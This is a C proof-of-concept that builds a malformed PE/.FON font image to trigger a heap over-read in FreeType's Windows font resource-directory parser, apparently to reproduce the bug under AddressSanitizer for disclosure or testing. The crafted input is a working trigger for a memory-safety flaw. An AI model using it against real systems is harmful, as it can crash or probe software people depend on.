/*
 * PoC: heap over-read in the Windows PE/.FON resource-directory parser
 * (fnt_face_get_dll_font, src/winfonts/winfnt.c).
 *
 * Builds a minimal, otherwise well-formed PE/.FON image whose root resource
 * directory declares number_of_named_entries + number_of_id_entries greater
 * than 0xFFFF, then feeds it through the public FreeType API
 * (FT_New_Memory_Face).  On the shipped tree the entry table is allocated
 * with a 16-bit (truncated) count while the processing loop walks the full
 * 32-bit count, so the loop reads past the allocation -> ASan abort.
 *
 * Build:
 *   cc -I include pocs/residual.c build-asan/libfreetyped.a \
 *      -fsanitize=address -lm -o /tmp/poc
 * Run:
 *   /tmp/poc
 */

#include <ft2build.h>
#include FT_FREETYPE_H

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

static void
put_u16( unsigned char*  p,
         unsigned int    v )
{
  p[0] = (unsigned char)( v & 0xFF );
  p[1] = (unsigned char)( ( v >> 8 ) & 0xFF );
}

static void
put_u32( unsigned char*  p,
         unsigned int    v )
{
  p[0] = (unsigned char)( v & 0xFF );
  p[1] = (unsigned char)( ( v >> 8 ) & 0xFF );
  p[2] = (unsigned char)( ( v >> 16 ) & 0xFF );
  p[3] = (unsigned char)( ( v >> 24 ) & 0xFF );
}

int
main( void )
{
  const unsigned int  lfanew   = 0x40;
  const unsigned int  sec_off  = lfanew + 248;   /* 0x138 */
  const unsigned int  rsrc_ptr = 0x200;          /* root_dir_offset        */
  const unsigned int  name_dir = rsrc_ptr + 0x20;/* empty child directory  */
  const unsigned int  size     = 0x300;

  unsigned char*  buf = (unsigned char*)calloc( 1, size );

  FT_Library  library;
  FT_Face     face;
  FT_Error    error;


  /* MZ header */
  put_u16( buf + 0x00, 0x5A4D );        /* "MZ"   */
  put_u32( buf + 0x3C, lfanew );        /* lfanew */

  /* PE header at lfanew */
  put_u32( buf + lfanew + 0,   0x00004550 );  /* "PE\0\0"                 */
  put_u16( buf + lfanew + 4,   0x014C );      /* machine = i386           */
  put_u16( buf + lfanew + 6,   1 );           /* number_of_sections       */
  put_u16( buf + lfanew + 20,  0x00E0 );      /* size_of_optional_header  */
  put_u16( buf + lfanew + 24,  0x010B );      /* magic32                  */
  put_u32( buf + lfanew + 136, 0x1000 );      /* rsrc_virtual_address     */
  put_u32( buf + lfanew + 140, 0x1000 );      /* rsrc_size                */

  /* section header */
  memcpy( buf + sec_off, ".rsrc\0\0\0", 8 );
  put_u32( buf + sec_off + 12, 0x1000 );      /* virtual_address          */
  put_u32( buf + sec_off + 16, 0x1000 );      /* size_of_raw_data         */
  put_u32( buf + sec_off + 20, rsrc_ptr );    /* pointer_to_raw_data      */

  /* root resource directory */
  put_u16( buf + rsrc_ptr + 12, 0x8000 );     /* number_of_named_entries  */
  put_u16( buf + rsrc_ptr + 14, 0x8001 );     /* number_of_id_entries     */
  /* sum = 0x10001, truncates to 1 in a 16-bit count */

  /* one well-formed root entry pointing at an empty sub-directory */
  put_u32( buf + rsrc_ptr + 16 + 0, 0 );              /* name            */
  put_u32( buf + rsrc_ptr + 16 + 4, 0x80000000u |
                                    ( name_dir - rsrc_ptr ) ); /* offset  */

  /* empty child directory (0 named, 0 id entries) */
  put_u16( buf + name_dir + 12, 0 );
  put_u16( buf + name_dir + 14, 0 );

  if ( FT_Init_FreeType( &library ) )
  {
    fprintf( stderr, "init failed\n" );
    return 2;
  }

  error = FT_New_Memory_Face( library, buf, (FT_Long)size, 0, &face );

  fprintf( stderr, "FT_New_Memory_Face returned 0x%x\n", error );

  if ( !error )
    FT_Done_Face( face );
  FT_Done_FreeType( library );
  free( buf );

  return 0;
}
